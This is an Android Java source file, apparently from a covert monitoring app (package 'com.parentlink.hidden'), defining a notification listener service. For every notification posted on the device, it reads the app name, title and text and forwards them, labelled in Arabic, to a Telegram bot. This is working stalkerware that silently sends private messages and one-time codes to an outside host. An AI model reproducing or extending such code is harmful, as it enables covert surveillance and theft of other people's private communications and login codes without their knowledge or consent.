package com.parentlink.hidden;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;
import androidx.core.app.NotificationCompat;

public class NotificationListener extends NotificationListenerService {
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        String title = "";
        String text = "";
        
        Bundle extras = sbn.getNotification().extras;
        if (extras != null) {
            title = extras.getString(NotificationCompat.EXTRA_TITLE, "");
            text = extras.getString(NotificationCompat.EXTRA_TEXT, "");
        }
        
        String message = "🔔 إشعار جديد\nالتطبيق: " + packageName + "\nالعنوان: " + title + "\nالمحتوى: " + text;
        TelegramBotHelper.sendMessageToBot(message);
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}
}